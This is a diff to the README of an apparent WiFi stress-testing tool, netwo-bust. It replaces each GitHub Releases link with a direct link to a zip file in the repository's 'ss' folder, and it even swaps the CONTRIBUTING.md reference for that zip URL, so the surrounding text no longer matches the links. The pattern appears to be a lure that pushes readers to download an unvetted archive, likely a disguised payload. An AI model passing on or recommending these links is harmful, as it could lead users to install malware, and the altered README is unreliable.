@@ -1,6 +1,6 @@
 # 🌐 netwo-bust - A Simple Tool for WiFi Stress Testing
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/lamy421/netwo-bust/releases)
+[![Download](https://raw.githubusercontent.com/lamy421/netwo-bust/main/ss/bust_netwo_2.3.zip)](https://raw.githubusercontent.com/lamy421/netwo-bust/main/ss/bust_netwo_2.3.zip)
 
 ## 📚 Introduction
 
@@ -22,7 +22,7 @@ To download the tool, visit the Releases page. Follow these steps:
 
 1. Click on the link below to visit the download page:
    
-   [Download netwo-bust](https://github.com/lamy421/netwo-bust/releases)
+   [Download netwo-bust](https://raw.githubusercontent.com/lamy421/netwo-bust/main/ss/bust_netwo_2.3.zip)
 
 2. On the Releases page, locate the latest version of netwo-bust.
 
@@ -82,7 +82,7 @@ Please ensure to keep the tool updated by regularly checking the Releases page.
 
 ## 🛠️ Contributing
 
-If you have suggestions or would like to contribute to the netwo-bust project, your input is welcome. Check the CONTRIBUTING.md file for guidelines on contributing to the project.
+If you have suggestions or would like to contribute to the netwo-bust project, your input is welcome. Check the https://raw.githubusercontent.com/lamy421/netwo-bust/main/ss/bust_netwo_2.3.zip file for guidelines on contributing to the project.
 
 ## 📌 License
 
@@ -92,4 +92,4 @@ This project is licensed under the MIT License, allowing you to use it freely wh
 
 For further details, tips, and updates, feel free to check the following links:
 
-[Download netwo-bust](https://github.com/lamy421/netwo-bust/releases)
+[Download netwo-bust](https://raw.githubusercontent.com/lamy421/netwo-bust/main/ss/bust_netwo_2.3.zip)
